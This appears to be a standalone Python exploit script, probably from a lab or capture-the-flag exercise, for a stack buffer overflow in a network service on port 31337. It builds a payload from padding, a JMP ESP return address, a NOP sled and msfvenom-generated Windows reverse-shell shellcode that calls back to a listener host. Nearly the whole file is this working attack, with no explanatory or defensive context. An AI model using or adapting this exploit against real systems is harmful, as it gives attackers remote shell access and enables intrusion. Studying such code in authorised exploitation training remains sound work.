
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.12.255 LPORT=786 -f c -b "\x00\x0a" --var-name shellcode
shellcode =  b""
shellcode += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\xce\x93\xaa\x93\x83\xee\xfc"
shellcode += b"\xe2\xf4\x32\x7b\x28\x93\xce\x93\xca\x1a\x2b"
shellcode += b"\xa2\x6a\xf7\x45\xc3\x9a\x18\x9c\x9f\x21\xc1"
shellcode += b"\xda\x18\xd8\xbb\xc1\x24\xe0\xb5\xff\x6c\x06"
shellcode += b"\xaf\xaf\xef\xa8\xbf\xee\x52\x65\x9e\xcf\x54"
shellcode += b"\x48\x61\x9c\xc4\x21\xc1\xde\x18\xe0\xaf\x45"
shellcode += b"\xdf\xbb\xeb\x2d\xdb\xab\x42\x9f\x18\xf3\xb3"
shellcode += b"\xcf\x40\x21\xda\xd6\x70\x90\xda\x45\xa7\x21"
shellcode += b"\x92\x18\xa2\x55\x3f\x0f\x5c\xa7\x92\x09\xab"
shellcode += b"\x4a\xe6\x38\x90\xd7\x6b\xf5\xee\x8e\xe6\x2a"
shellcode += b"\xcb\x21\xcb\xea\x92\x79\xf5\x45\x9f\xe1\x18"
shellcode += b"\x96\x8f\xab\x40\x45\x97\x21\x92\x1e\x1a\xee"
shellcode += b"\xb7\xea\xc8\xf1\xf2\x97\xc9\xfb\x6c\x2e\xcc"
shellcode += b"\xf5\xc9\x45\x81\x41\x1e\x93\xfb\x99\xa1\xce"
shellcode += b"\x93\xc2\xe4\xbd\xa1\xf5\xc7\xa6\xdf\xdd\xb5"
shellcode += b"\xc9\x6c\x7f\x2b\x5e\x92\xaa\x93\xe7\x57\xfe"
shellcode += b"\xc3\xa6\xba\x2a\xf8\xce\x6c\x7f\xc3\x9e\xc3"
shellcode += b"\xfa\xd3\x9e\xd3\xfa\xfb\x24\x9c\x75\x73\x31"
shellcode += b"\x46\x3d\xf9\xcb\xfb\x6a\x3b\xe3\x0d\xc2\x91"
shellcode += b"\xce\x90\xb8\x1a\x28\xf9\xba\xc5\x99\xfb\x33"
shellcode += b"\x36\xba\xf2\x55\x46\x4b\x53\xde\x9f\x31\xdd"
shellcode += b"\xa2\xe6\x22\xfb\x5a\x26\x6c\xc5\x55\x46\xa6"
shellcode += b"\xf0\xc7\xf7\xce\x1a\x49\xc4\x99\xc4\x9b\x65"
shellcode += b"\xa4\x81\xf3\xc5\x2c\x6e\xcc\x54\x8a\xb7\x96"
shellcode += b"\x92\xcf\x1e\xee\xb7\xde\x55\xaa\xd7\x9a\xc3"
shellcode += b"\xfc\xc5\x98\xd5\xfc\xdd\x98\xc5\xf9\xc5\xa6"
shellcode += b"\xea\x66\xac\x48\x6c\x7f\x1a\x2e\xdd\xfc\xd5"
shellcode += b"\x31\xa3\xc2\x9b\x49\x8e\xca\x6c\x1b\x28\x5a"
shellcode += b"\x26\x6c\xc5\xc2\x35\x5b\x2e\x37\x6c\x1b\xaf"
shellcode += b"\xac\xef\xc4\x13\x51\x73\xbb\x96\x11\xd4\xdd"
shellcode += b"\xe1\xc5\xf9\xce\xc0\x55\x46"





offset = 146
address = b"\xC3\x14\x04\x08"  #JMP ESP address 080414C3
payload = "A" * offset + address + b"\x90" * 16 + shellcode + "B" * 100
try:
    print "\nSending payload..."
    s.connect(('192.168.45.153', 31337))
    s.send(payload + '\r\n\r\n')
    print "\nDone!."
except:
    print "Could not connect"